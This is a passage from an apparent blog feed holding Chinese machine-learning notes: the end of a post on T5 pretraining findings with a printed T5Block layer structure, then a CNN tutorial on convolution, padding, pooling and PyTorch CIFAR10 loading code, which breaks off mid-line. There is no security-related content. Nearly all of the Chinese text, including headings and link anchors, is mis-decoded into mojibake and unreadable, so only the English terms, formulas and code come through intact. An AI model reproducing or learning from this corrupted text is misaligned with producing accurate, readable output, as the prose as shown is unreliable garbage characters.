href="#é¢„è®­ç»ƒè¿‡ç¨‹" class="headerlink" title="é¢„è®­ç»ƒè¿‡ç¨‹"></a>é¢„è®­ç»ƒè¿‡ç¨‹</h1><p><img src="/Pictures/DL/T5/4.png" alt="tasks"></p><h2 id="é«˜å±‚æ¬¡æ–¹æ³•ï¼ˆè‡ªç›‘ç£çš„é¢„è®­ç»ƒæ–¹æ³•ï¼‰å¯¹æ¯”"><a href="#é«˜å±‚æ¬¡æ–¹æ³•ï¼ˆè‡ªç›‘ç£çš„é¢„è®­ç»ƒæ–¹æ³•ï¼‰å¯¹æ¯”" class="headerlink" title="é«˜å±‚æ¬¡æ–¹æ³•ï¼ˆè‡ªç›‘ç£çš„é¢„è®­ç»ƒæ–¹æ³•ï¼‰å¯¹æ¯”"></a>é«˜å±‚æ¬¡æ–¹æ³•ï¼ˆè‡ªç›‘ç£çš„é¢„è®­ç»ƒæ–¹æ³•ï¼‰å¯¹æ¯”</h2><ol><li><p>è¯­è¨€æ¨¡å‹å¼ï¼Œç±» GPT-2 æ–¹å¼ï¼Œä»å·¦åˆ°å³é¢„æµ‹</p></li><li><p>BERT-styleå¼ï¼Œå°±æ˜¯åƒBERTä¸€æ ·å°†ä¸€éƒ¨åˆ†ç»™ç ´åæ‰ï¼Œç„¶åè¿˜åŸå‡ºæ¥ï¼Œå…¶æ•ˆæœæœ€å¥½</p></li><li><p>Deshufflingï¼ˆé¡ºåºè¿˜åŸï¼‰å¼ï¼Œå°±æ˜¯å°†æ–‡æœ¬æ‰“ä¹±ï¼Œç„¶åè¿˜åŸå‡ºæ¥</p></li></ol><h2 id="æ©ç ç­–ç•¥"><a href="#æ©ç ç­–ç•¥" class="headerlink" title="æ©ç ç­–ç•¥"></a>æ©ç ç­–ç•¥</h2><ol><li><p>Maskæ³•ï¼Œå¦‚ç°åœ¨å¤§å¤šæ¨¡å‹çš„åšæ³•ï¼Œå°†è¢«ç ´åtokenæ¢æˆç‰¹æ®Šç¬¦å¦‚[M]</p></li><li><p>Replace spanæ³•ï¼Œå¯ä»¥å½“ä½œæ˜¯æŠŠä¸Šé¢ Mask æ³•ä¸­ç›¸é‚» [M] éƒ½åˆæˆäº†ä¸€ä¸ªç‰¹æ®Šç¬¦ï¼Œæ¯ä¸€å°æ®µæ›¿æ¢ä¸€ä¸ªç‰¹æ®Šç¬¦ï¼Œæé«˜è®¡ç®—æ•ˆç‡ï¼Œå…¶æ•ˆæœæœ€å¥½</p></li><li><p>Dropæ³•ï¼Œæ²¡æœ‰æ›¿æ¢æ“ä½œï¼Œç›´æ¥éšæœºä¸¢å¼ƒä¸€äº›å­—ç¬¦</p></li></ol><h2 id="å¯¹æ–‡æœ¬è¿›è¡Œå¤šå¤§ç¨‹åº¦çš„ç ´å"><a href="#å¯¹æ–‡æœ¬è¿›è¡Œå¤šå¤§ç¨‹åº¦çš„ç ´å" class="headerlink" title="å¯¹æ–‡æœ¬è¿›è¡Œå¤šå¤§ç¨‹åº¦çš„ç ´å"></a>å¯¹æ–‡æœ¬è¿›è¡Œå¤šå¤§ç¨‹åº¦çš„ç ´å</h2><p>æŒ‘äº† 4 ä¸ªå€¼ï¼š10%ï¼Œ15%ï¼Œ25%ï¼Œ50%ï¼Œæœ€åå‘ç° BERT çš„ 15%æ•ˆæœæœ€å¥½</p><h2 id="Replace-Span"><a href="#Replace-Span" class="headerlink" title="Replace Span"></a>Replace Span</h2><p>éœ€è¦å†³å®šå¯¹å¤§æ¦‚å¤šé•¿çš„å°æ®µè¿›è¡Œç ´åï¼Œäºæ˜¯å¯¹ä¸åŒé•¿åº¦è¿›è¡Œæ¢ç´¢ï¼š2ï¼Œ3ï¼Œ5ï¼Œ10è¿™å››ä¸ªå€¼ï¼Œæœ€åå‘ç°3æ•ˆæœæœ€å¥½ã€‚</p><h1 id="è®­ç»ƒç»“è®º"><a href="#è®­ç»ƒç»“è®º" class="headerlink" title="è®­ç»ƒç»“è®º"></a>è®­ç»ƒç»“è®º</h1><ul><li>Architectures</li></ul><p>åŸå§‹çš„Transformerç»“æ„è¡¨ç°æœ€å¥½</p><p>encoder-decoderç»“æ„å’ŒBERTã€GPTçš„è®¡ç®—é‡å·®ä¸å¤š</p><p>å…±äº«encoderå’Œdecoderçš„å‚æ•°æ²¡æœ‰ä½¿æ•ˆæœå·®å¤ªå¤š</p><ul><li>Unsupervised objectives</li></ul><p>è‡ªç¼–ç å’Œè‡ªå›å½’çš„æ•ˆæœå·®ä¸å¤š</p><p>æ¨èé€‰æ‹©æ›´çŸ­ç›®æ ‡åºåˆ—çš„ç›®æ ‡å‡½æ•°ï¼Œæé«˜è®¡ç®—æ•ˆç‡</p><ul><li>Datasets</li></ul><p>åœ¨é¢†åŸŸå†…è¿›è¡Œæ— ç›‘ç£è®­ç»ƒå¯ä»¥æå‡ä¸€äº›ä»»åŠ¡çš„æ•ˆæœï¼Œä½†åœ¨ä¸€ä¸ªå°é¢†åŸŸæ•°æ®ä¸Šé‡å¤è®­ç»ƒä¼šé™ä½æ•ˆæœ</p><p>Largeã€diverseçš„æ•°æ®é›†æ•ˆæœæœ€å¥½</p><ul><li>Training strategies</li></ul><p>ç²¾è°ƒæ—¶æ›´æ–°æ‰€æœ‰å‚æ•° &gt; æ›´æ–°éƒ¨åˆ†å‚æ•°</p><p>åœ¨å¤šä¸ªä»»åŠ¡ä¸Šé¢„è®­ç»ƒä¹‹åå¾®è°ƒ &#x3D; æ— ç›‘ç£é¢„è®­ç»ƒ</p><ul><li>Scaling</li></ul><p>åœ¨å°æ¨¡å‹ä¸Šè®­ç»ƒæ›´å¤šæ•°æ® &lt; ç”¨å°‘é‡æ­¥æ•°è®­ç»ƒæ›´å¤§çš„æ¨¡å‹</p><p>ä»ä¸€ä¸ªé¢„è®­ç»ƒæ¨¡å‹ä¸Šå¾®è°ƒå¤šä¸ªæ¨¡å‹åé›†æˆ &lt; åˆ†å¼€é¢„è®­ç»ƒ+å¾®è°ƒåé›†æˆ</p><h1 id="æ¨¡å‹ç»“æ„"><a href="#æ¨¡å‹ç»“æ„" class="headerlink" title="æ¨¡å‹ç»“æ„"></a>æ¨¡å‹ç»“æ„</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros">T5Block(<br>    (layer): ModuleList(<br>      (0): T5LayerSelfAttention(<br>        (SelfAttention): T5Attention(<br>          (q): Linear(<span class="hljs-attribute">in_features</span>=1024, <span class="hljs-attribute">out_features</span>=1024, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">False</span>)<br>          (k): Linear(<span class="hljs-attribute">in_features</span>=1024, <span class="hljs-attribute">out_features</span>=1024, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">False</span>)<br>          (v): Linear(<span class="hljs-attribute">in_features</span>=1024, <span class="hljs-attribute">out_features</span>=1024, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">False</span>)<br>          (o): Linear(<span class="hljs-attribute">in_features</span>=1024, <span class="hljs-attribute">out_features</span>=1024, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">False</span>)<br>        )<br>        (layer_norm): T5LayerNorm()<br>        (dropout): Dropout(<span class="hljs-attribute">p</span>=0.1, <span class="hljs-attribute">inplace</span>=<span class="hljs-literal">False</span>)<br>      )<br>      (1): T5LayerCrossAttention(<br>        (EncDecAttention): T5Attention(<br>          (q): Linear(<span class="hljs-attribute">in_features</span>=1024, <span class="hljs-attribute">out_features</span>=1024, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">False</span>)<br>          (k): Linear(<span class="hljs-attribute">in_features</span>=1024, <span class="hljs-attribute">out_features</span>=1024, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">False</span>)<br>          (v): Linear(<span class="hljs-attribute">in_features</span>=1024, <span class="hljs-attribute">out_features</span>=1024, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">False</span>)<br>          (o): Linear(<span class="hljs-attribute">in_features</span>=1024, <span class="hljs-attribute">out_features</span>=1024, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">False</span>)<br>        )<br>        (layer_norm): T5LayerNorm()<br>        (dropout): Dropout(<span class="hljs-attribute">p</span>=0.1, <span class="hljs-attribute">inplace</span>=<span class="hljs-literal">False</span>)<br>      )<br>      (2): T5LayerFF(<br>        (DenseReluDense): T5DenseReluDense(<br>          (wi): Linear(<span class="hljs-attribute">in_features</span>=1024, <span class="hljs-attribute">out_features</span>=4096, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">False</span>)<br>          (wo): Linear(<span class="hljs-attribute">in_features</span>=4096, <span class="hljs-attribute">out_features</span>=1024, <span class="hljs-attribute">bias</span>=<span class="hljs-literal">False</span>)<br>          (dropout): Dropout(<span class="hljs-attribute">p</span>=0.1, <span class="hljs-attribute">inplace</span>=<span class="hljs-literal">False</span>)<br>          (relu_act): ReLU()<br>        )<br>        (layer_norm): T5LayerNorm()<br>        (dropout): Dropout(<span class="hljs-attribute">p</span>=0.1, <span class="hljs-attribute">inplace</span>=<span class="hljs-literal">False</span>)<br>      )<br>    )<br>)<br></code></pre></td></tr></table></figure><hr><p>å‚è€ƒï¼š</p><ol><li><a href="https://www.jianshu.com/p/627d4643f7a7">https://www.jianshu.com/p/627d4643f7a7</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Deep Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CNNâ€”â€”å·ç§¯ç¥ç»ç½‘ç»œ</title>
    <link href="/2024/03/18/CNN/"/>
    <url>/2024/03/18/CNN/</url>
    
    <content type="html"><![CDATA[<h1 id="å·ç§¯ç¥ç»ç½‘ç»œ-CNN-æ¦‚è¿°"><a href="#å·ç§¯ç¥ç»ç½‘ç»œ-CNN-æ¦‚è¿°" class="headerlink" title="å·ç§¯ç¥ç»ç½‘ç»œ(CNN)æ¦‚è¿°"></a>å·ç§¯ç¥ç»ç½‘ç»œ(CNN)æ¦‚è¿°</h1><p>æ•´ä½“æ¶æ„åˆ†ä¸ºï¼š</p><ol><li>è¾“å…¥å±‚</li><li>å·ç§¯å±‚</li><li>æ± åŒ–å±‚</li><li>å…¨è¿æ¥å±‚</li><li>æ¿€æ´»å‡½æ•°</li></ol><p>å·ç§¯ç¥ç»ç½‘ç»œç”±ä¸€ä¸ªæˆ–å¤šä¸ªå·ç§¯å±‚ã€æ± åŒ–å±‚ä»¥åŠå…¨è¿æ¥å±‚ç­‰ç»„æˆã€‚ä¸å…¶ä»–æ·±åº¦å­¦ä¹ ç»“æ„ç›¸æ¯”ï¼Œå·ç§¯ç¥ç»ç½‘ç»œåœ¨å›¾åƒç­‰æ–¹é¢èƒ½å¤Ÿç»™å‡ºæ›´å¥½çš„ç»“æœã€‚</p><p><img src="/Pictures/DL/CNN/plot01.svg" alt="img"></p><h2 id="å·ç§¯å±‚"><a href="#å·ç§¯å±‚" class="headerlink" title="å·ç§¯å±‚"></a>å·ç§¯å±‚</h2><h3 id="å·ç§¯è¿ç®—"><a href="#å·ç§¯è¿ç®—" class="headerlink" title="å·ç§¯è¿ç®—"></a>å·ç§¯è¿ç®—</h3><p>è‹¥ä¸€ä¸ª 6*6çš„å•é€šé“å›¾åƒä¸ä¸€ä¸ª 3*3çš„å·ç§¯æ ¸è¿›è¡Œå·ç§¯è¿ç®—ï¼Œé‚£ä¹ˆä»å›¾åƒçš„å·¦ä¸Šè§’å¼€å§‹é€‰å–3*3çš„åŒºåŸŸï¼Œå°†è¯¥åŒºåŸŸçš„çŸ©é˜µä¸å·ç§¯æ ¸çš„å¯¹åº”ä½ç½®çš„å…ƒç´ ç›¸ä¹˜æ±‚å’Œå¾—åˆ°çš„ç»“æœä¾¿ä¸ºè¾“å‡ºçŸ©é˜µçš„å·¦ä¸Šè§’å…ƒç´ ã€‚</p><p>$$\begin{bmatrix}<br>  10&amp;  10&amp;  10&amp;  0&amp;  0&amp; 0\\<br>  10&amp;  10&amp;  10&amp;  0&amp;  0&amp; 0\\<br>  10&amp;  10&amp;  10&amp;  0&amp;  0&amp; 0 \\<br>  10&amp;  10&amp;  10&amp;  0&amp;  0&amp; 0\\<br>  10&amp;  10&amp;  10&amp;  0&amp;  0&amp; 0 \\<br>  10&amp;  10&amp;  10&amp;  0&amp;  0&amp; 0<br>\end{bmatrix}*\begin{bmatrix}<br>  1&amp; 0 &amp; -1\\<br>  1&amp; 0 &amp; -1\\<br>  1&amp; 0 &amp; -1<br>\end{bmatrix}&#x3D;\begin{bmatrix}<br>  0&amp;  30&amp;  30&amp; 0\\<br>  0&amp;  30&amp;  30&amp; 0\\<br>  0&amp;  30&amp;  30&amp; 0\\<br>  0&amp;  30&amp;  30&amp; 0<br>\end{bmatrix}$$</p><p>å·ç§¯è¿ç®—çš„ç›®çš„æ˜¯æå–è¾“å…¥çš„ä¸åŒç‰¹å¾ï¼ŒæŸäº›å·ç§¯å±‚å¯èƒ½åªèƒ½æå–ä¸€äº›ä½çº§çš„ç‰¹å¾ï¼Œæ›´å¤šå±‚çš„ç½‘ç»œèƒ½ä»ä½çº§ç‰¹å¾ä¸­è¿­ä»£æå–æ›´å¤æ‚çš„ç‰¹å¾ã€‚</p><h3 id="å·ç§¯å±‚çš„æ„æˆ"><a href="#å·ç§¯å±‚çš„æ„æˆ" class="headerlink" title="å·ç§¯å±‚çš„æ„æˆ"></a>å·ç§¯å±‚çš„æ„æˆ</h3><p><strong>å‚æ•°ï¼š</strong></p><ul><li><p>sizeï¼šå·ç§¯æ ¸çš„å¤§å°ï¼Œé€‰æ‹©ä¸€èˆ¬æœ‰ 1*1, 3*3, 5*5</p><blockquote><p>å¯¹äºå·ç§¯æ ¸å¤§å°ï¼Œä¸€èˆ¬é‡‡å–å¥‡æ•°ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯ä¾¿äºæŒ‡å‡ºä¸­å¿ƒã€‚</p></blockquote></li><li><p>paddingï¼šä¸€èˆ¬ä¸ºé›¶å¡«å……ï¼Œæœ‰<em>Validå’ŒSame</em>ä¸¤ç§æ–¹å¼ã€‚</p><p>  å¯¹äºpaddingçš„è§£é‡Šï¼š</p><ul><li><p>é›¶å¡«å……ï¼šåœ¨å›¾ç‰‡åƒç´ çš„æœ€å¤–å±‚åŠ ä¸Šè‹¥å¹²å±‚0å€¼ï¼Œè‹¥åŠ 1å±‚ï¼Œè®°ä¸º <em>p&#x3D;1</em><br>  å¢åŠ 0æ˜¯å› ä¸º0åœ¨æƒé‡ä¹˜ç§¯è¿ç®—ä¸­å¯¹æœ€ç»ˆç»“æœä¸é€ æˆå½±å“ï¼Œä¹Ÿå°±é¿å…äº†å›¾ç‰‡å¢åŠ äº†é¢å¤–çš„å¹²æ‰°ä¿¡æ¯ã€‚</p></li><li><p>Validï¼šä¸å¡«å……ï¼Œä¿æŒåŸçŠ¶ï¼Œç»“æœå˜å°</p></li><li><p>Sameï¼šè¾“å‡ºçš„å¤§å°ä¸åŸå›¾å¤§å°ä¸€è‡´</p></li></ul></li><li><p>strideï¼šæ­¥é•¿ï¼Œé€šå¸¸é»˜è®¤ä¸º1</p></li><li><p>biasï¼šåç½®</p></li></ul><p>å¯¹äºæ¯ä¸ªå·ç§¯æ ¸ï¼Œéƒ½ä¼šæœ‰ä¸€ä¸ªåç½®å‚æ•° $b$ã€‚</p><p>åœ¨å·ç§¯æ“ä½œçš„è®¡ç®—ä¸­ï¼Œåç½®ä¼šä¸å·ç§¯æ ¸çš„åŠ æƒå’Œç›¸åŠ ï¼Œå¹¶ä¸”ä¼šåœ¨æ•´ä¸ªè¾“å‡ºå›¾åƒä¸Šå…±äº«ã€‚å…·ä½“åœ°ï¼Œè¾“å‡ºå›¾åƒä¸­çš„æ¯ä¸ªåƒç´ å€¼ $y$ å¯ä»¥è®¡ç®—å¦‚ä¸‹ï¼š</p><p>$$y &#x3D; \sum_{i&#x3D;1}^{M} \sum_{j&#x3D;1}^{N} (w_{i,j} \cdot x_{i,j}) + b $$</p><p>å…¶ä¸­ $w_{i,j}$ æ˜¯å·ç§¯æ ¸çš„æƒé‡ï¼Œ$x_{i,j}$ æ˜¯è¾“å…¥æ•°æ®çš„å¯¹åº”åƒç´ å€¼ï¼Œ$b$ æ˜¯åç½®å‚æ•°ã€‚</p><p><strong>å¤šé€šé“å·ç§¯ï¼š</strong></p><p>å½“è¾“å…¥æœ‰å¤šä¸ªé€šé“ï¼ˆchannelï¼‰æ—¶ï¼ˆä¾‹å¦‚å›¾ç‰‡å¯ä»¥æœ‰RGBä¸‰é€šé“ï¼‰ï¼Œå·ç§¯æ ¸éœ€è¦æ‹¥æœ‰ç›¸åŒçš„channelæ•°ï¼Œæ¯ä¸ªå·ç§¯æ ¸channelä¸è¾“å…¥å±‚å¯¹åº”çš„channelè¿›è¡Œå·ç§¯ï¼Œå°†æ¯ä¸ªchannelçš„å·ç§¯ç»“æœæŒ‰ä½ç›¸åŠ å¾—åˆ°æœ€ç»ˆçš„ Feature Mapã€‚</p><p><strong>å¤šå·ç§¯æ ¸å·ç§¯ï¼š</strong></p><p>å½“æœ‰å¤šä¸ªå·ç§¯æ ¸æ—¶ï¼Œå¯ä»¥å­¦ä¹ åˆ°å¤šç§ä¸åŒçš„ç‰¹å¾ï¼Œå¯¹åº”äº§ç”ŸåŒ…å«å¤šä¸ªchannelçš„ Feature Mapï¼Œä¾‹å¦‚å½“æ‹¥æœ‰ä¸¤ä¸ªkernelæ—¶ï¼Œè¾“å‡ºç»“æœä¼šæœ‰ä¸¤ä¸ªchannelã€‚</p><p>å¾—åˆ°çš„ç‰¹å¾å›¾å¤§å°ä¸å˜ï¼Œæ•°é‡å˜å¤šã€‚</p><p><strong>è¿™é‡Œçš„å¤šå°‘ä¸ªå·ç§¯æ ¸ä¹Ÿå¯ä»¥ç†è§£ä¸ºå¤šå°‘ä¸ªç¥ç»å…ƒã€‚</strong></p><p><strong>ä¾‹å­ï¼š</strong></p><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€å¼  $200\times 200$ çš„å›¾ç‰‡ï¼Œ10ä¸ªkernelï¼Œsize&#x3D;3*3ï¼Œchannel&#x3D;3(è®¡ç®—RGBå›¾ç‰‡)ï¼Œå¹¶ä¸”åªæœ‰ä¸€å±‚å·ç§¯ï¼Œæ­¥é•¿ä¸º1ï¼Œé‚£ä¹ˆå‚æ•°çš„è®¡ç®—è¿‡ç¨‹ä¸ºï¼š</p><p>å¯¹äºæ¯ä¸ªkernelï¼Œæœ‰ $3\times 3\times 3+1$ ä¸ªå‚æ•°</p><p>æ‰€ä»¥æ€»å…±æœ‰ $28\times 10&#x3D;280$ ä¸ªå‚æ•°ã€‚</p><p>é›¶å¡«å……çš„å±‚æ•° $P&#x3D;\frac{(N-1)\times s+F-N}{2}&#x3D;\frac{199+3-200}{2}&#x3D;1$</p><p>$N$ ä¸ºå›¾ç‰‡å¤§å°ï¼Œ $s$ ä¸ºstrideï¼Œ $F$ ä¸ºå·ç§¯æ ¸å¤§å°</p><h2 id="æ± åŒ–å±‚"><a href="#æ± åŒ–å±‚" class="headerlink" title="æ± åŒ–å±‚"></a>æ± åŒ–å±‚</h2><p>æ± åŒ–å±‚ä¸»è¦å¯¹å·ç§¯å±‚å­¦ä¹ åˆ°çš„ç‰¹å¾å›¾è¿›è¡Œäºšé‡‡æ ·ï¼ˆsubsamplingï¼‰ï¼Œä¸»è¦æœ‰ä¸¤ç§ï¼š</p><ol><li>æœ€å¤§æ± åŒ–ï¼šMax Poolingï¼Œå–çª—å£å†…çš„æœ€å¤§å€¼ä½œä¸ºè¾“å‡º</li><li>å¹³å‡æ± åŒ–ï¼šAvg Poolingï¼Œå–çª—å£å†…æ‰€æœ‰å€¼çš„å‡å€¼ä½œä¸ºè¾“å‡º</li></ol><p>æ„ä¹‰åœ¨äºï¼š</p><ul><li>é™ä½äº†åç»­ç½‘ç»œå±‚çš„è¾“å…¥ç»´åº¦ï¼Œç¼©å‡æ¨¡å‹å¤§å°ï¼Œæé«˜è®¡ç®—é€Ÿåº¦</li><li>æé«˜äº†Feature Mapçš„é²æ£’æ€§ï¼Œé˜²æ­¢è¿‡æ‹Ÿåˆ</li></ul><p>ä¸€èˆ¬æ¥è¯´æ± åŒ–æ“ä½œå³ä¸ºé€‰å–å›¾ç‰‡çš„ä¸€ä¸ªå›ºå®šå¤§å°çš„åŒºåŸŸï¼ˆçª—å£ï¼‰ï¼Œåœ¨è¯¥åŒºåŸŸä¸­å¾—åˆ°ä¸€ä¸ªä»£è¡¨è¿™ä¸ªåŒºåŸŸçš„æ•°å€¼ï¼Œå¹¶æ€»å’Œè¾“å‡ºç»“æœã€‚</p><p>çª—å£è®¾ç½®ï¼šä¸€èˆ¬å¤§å°ä¸º $2\times 2$, $stride&#x3D;2$ ã€‚</p><p>åœ¨å¤„ç†å¤šé€šé“è¾“å…¥æ•°æ®æ—¶ï¼Œæ± åŒ–å±‚å¯¹æ¯ä¸ªè¾“å…¥é€šé“åˆ†åˆ«æ± åŒ–ï¼Œè€Œä¸æ˜¯åƒå·ç§¯å±‚é‚£æ ·å°†å„ä¸ªé€šé“çš„è¾“å…¥ç›¸åŠ ã€‚è¿™æ„å‘³ç€æ± åŒ–å±‚çš„è¾“å‡ºå’Œè¾“å…¥çš„é€šé“æ•°æ˜¯ç›¸ç­‰ã€‚</p><h2 id="å…¨è¿æ¥å±‚"><a href="#å…¨è¿æ¥å±‚" class="headerlink" title="å…¨è¿æ¥å±‚"></a>å…¨è¿æ¥å±‚</h2><p>å…¨è¿æ¥å±‚çš„ç›®çš„æ˜¯å°†å·ç§¯å’Œæ± åŒ–å±‚æå–çš„ç‰¹å¾è¿›è¡Œæ•´åˆï¼Œå¹¶è¾“å‡ºåˆ°æœ€ç»ˆçš„è¾“å‡ºå±‚ï¼Œä»¥è¿›è¡Œåˆ†ç±»ã€å›å½’æˆ–å…¶ä»–ä»»åŠ¡ã€‚</p><p>å·ç§¯å±‚ï¼‹æ¿€æ´»å±‚ï¼‹æ± åŒ–å±‚å¯ä»¥çœ‹ä½œæ˜¯CNNçš„ç‰¹å¾å­¦ä¹ &#x2F;ç‰¹å¾æå–å±‚ï¼Œè€Œå­¦ä¹ åˆ°çš„ç‰¹å¾æœ€ç»ˆè¿ç”¨äºæ¨¡å‹ä»»åŠ¡ï¼Œä¸€èˆ¬æ¥è¯´åˆ†ä¸ºåˆ†ç±»æˆ–å›å½’ã€‚</p><ul><li><p>å…ˆå¯¹æ‰€æœ‰ Feature Map è¿›è¡Œæ‰å¹³åŒ–ï¼ˆflattenï¼Œå³reshapeæˆ $1\times N$ çš„å‘é‡ï¼‰</p></li><li><p>å†æ¥ä¸€ä¸ªæˆ–å¤šä¸ªå…¨è¿æ¥å±‚ï¼Œè¿›è¡Œæ¨¡å‹å­¦ä¹ </p></li></ul><p><img src="/Pictures/DL/CNN/plot02.png" alt="img"></p><h1 id="æ„å»ºCNNå®ç°å›¾ç‰‡åˆ†ç±»"><a href="#æ„å»ºCNNå®ç°å›¾ç‰‡åˆ†ç±»" class="headerlink" title="æ„å»ºCNNå®ç°å›¾ç‰‡åˆ†ç±»"></a>æ„å»ºCNNå®ç°å›¾ç‰‡åˆ†ç±»</h1><h2 id="åˆ†ç±»å™¨ä»»åŠ¡å’Œæ•°æ®ä»‹ç»"><a href="#åˆ†ç±»å™¨ä»»åŠ¡å’Œæ•°æ®ä»‹ç»" class="headerlink" title="åˆ†ç±»å™¨ä»»åŠ¡å’Œæ•°æ®ä»‹ç»"></a>åˆ†ç±»å™¨ä»»åŠ¡å’Œæ•°æ®ä»‹ç»</h2><ul><li>æ„é€ ä¸€ä¸ªå°†ä¸åŒå›¾åƒè¿›è¡Œåˆ†ç±»çš„ç¥ç»ç½‘ç»œåˆ†ç±»å™¨ï¼Œå¯¹è¾“å…¥çš„å›¾ç‰‡è¿›è¡Œåˆ¤åˆ«å¹¶å®Œæˆåˆ†ç±»</li><li>é‡‡ç”¨ <strong>CIFAR10</strong> æ•°æ®é›†ä½œä¸ºåŸå§‹å›¾ç‰‡æ•°æ®</li></ul><blockquote><p>CIFAR10æ•°æ®é›†ä»‹ç»ï¼šæ•°æ®é›†ä¸­æ¯å¼ å›¾ç‰‡çš„å°ºå¯¸æ˜¯ 3*32*32 ï¼Œä»£è¡¨å½©è‰²ä¸‰é€šé“ã€‚<br>CIFAR10æ•°æ®é›†æ€»å…±æœ‰10ç§ä¸åŒçš„åˆ†ç±»ï¼Œåˆ†åˆ«æ˜¯ <em>â€œairplaneâ€,â€automobileâ€,â€birdâ€,â€catâ€,â€deerâ€,â€dogâ€,â€frogâ€,â€horseâ€,â€shipâ€,â€truckâ€</em></p></blockquote><p><img src="/Pictures/DL/CNN/plot03.png" alt="img"></p><h2 id="è®­ç»ƒåˆ†ç±»å™¨çš„æ­¥éª¤"><a href="#è®­ç»ƒåˆ†ç±»å™¨çš„æ­¥éª¤" class="headerlink" title="è®­ç»ƒåˆ†ç±»å™¨çš„æ­¥éª¤"></a>è®­ç»ƒåˆ†ç±»å™¨çš„æ­¥éª¤</h2><ol><li>ä½¿ç”¨torchvisionä¸‹è½½CIFAR10æ•°æ®é›†</li><li>å®šä¹‰å·ç§¯ç¥ç»ç½‘ç»œ</li><li>å®šä¹‰æŸå¤±å‡½æ•°</li><li>åœ¨è®­ç»ƒé›†ä¸Šè®­ç»ƒæ¨¡å‹</li><li>åœ¨æµ‹è¯•é›†ä¸Šæµ‹è¯•æ¨¡å‹</li></ol><h2 id="æ„å»ºç¥ç»ç½‘ç»œçš„åŸºæœ¬æ­¥éª¤"><a href="#æ„å»ºç¥ç»ç½‘ç»œçš„åŸºæœ¬æ­¥éª¤" class="headerlink" title="æ„å»ºç¥ç»ç½‘ç»œçš„åŸºæœ¬æ­¥éª¤"></a>æ„å»ºç¥ç»ç½‘ç»œçš„åŸºæœ¬æ­¥éª¤</h2><ul><li>ä½¿ç”¨PyTorchæ„å»ºç¥ç»ç½‘ç»œï¼Œä¸»è¦çš„å·¥å…·éƒ½åœ¨<strong>torch.nn</strong>åŒ…ä¸­</li><li>nnä¾èµ–äºautogradæ¥å®šä¹‰æ¨¡å‹ï¼Œå¹¶å¯¹å…¶è‡ªåŠ¨æ±‚å¯¼</li></ul><p>ä¸»è¦æ­¥éª¤ï¼š</p><ol><li>å®šä¹‰ä¸€ä¸ªæ‹¥æœ‰å¯å­¦ä¹ å‚æ•°çš„ç¥ç»ç½‘ç»œ</li><li>éå†è®­ç»ƒæ•°æ®é›†</li><li>å¤„ç†è¾“å…¥æ•°æ®ä½¿å…¶æµå‘ç¥ç»ç½‘ç»œ</li><li>è®¡ç®—æŸå¤±å€¼</li><li>å°†ç½‘ç»œå‚æ•°çš„æ¢¯åº¦è¿›è¡Œåå‘ä¼ é€’</li><li>ä»¥ä¸€å®šçš„è§„åˆ™æ›´æ–°ç½‘ç»œçš„æƒé‡</li></ol><h2 id="ä¸‹è½½æ•°æ®é›†"><a href="#ä¸‹è½½æ•°æ®é›†" class="headerlink" title="ä¸‹è½½æ•°æ®é›†"></a>ä¸‹è½½æ•°æ®é›†</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">import</span> torchvision.transforms <span class="hljs-keyword">as</span> transforms<br><br><span class="hljs-comment"># ä¸‹è½½æ•°æ®é›†å¹¶å¯¹å›¾ç‰‡è¿›è¡Œè°ƒæ•´ï¼Œå› ä¸ºtorchvisionæ•°æ®é›†çš„è¾“å‡ºæ˜¯PILImageæ ¼å¼ï¼Œæ•°æ®åŸŸåœ¨[0, 1]ã€‚</span><br><span class="hljs-comment"># æˆ‘ä»¬å°†å…¶è½¬æ¢ä¸ºæ ‡å‡†æ•°æ®åŸŸ[-1, 1]çš„å¼ é‡æ ¼å¼</span><br>transform = transforms.Compose(<br>    [transforms.ToTensor(),<br>     transforms.Normalize((<span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>), (<span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>))])<br>trainset = torchvision.datasets.CIFAR10(root=<span class="hljs-string">&#x27;./data&#x27;</span>, train=<span class="hljs-literal">True</span>, download=<span class="hljs-literal">True</span>, transform=transform)<br><br>trainloader = torch.utils.data.DataLoader(trainset, batch_size=<span class="hljs-number">4</span>, shuffle=<span class="hljs-literal">True</span>, num_workers=<span class="hljs-number">2</span>)<br><br>testset = torchvision.datasets.CIFAR10(root=<span 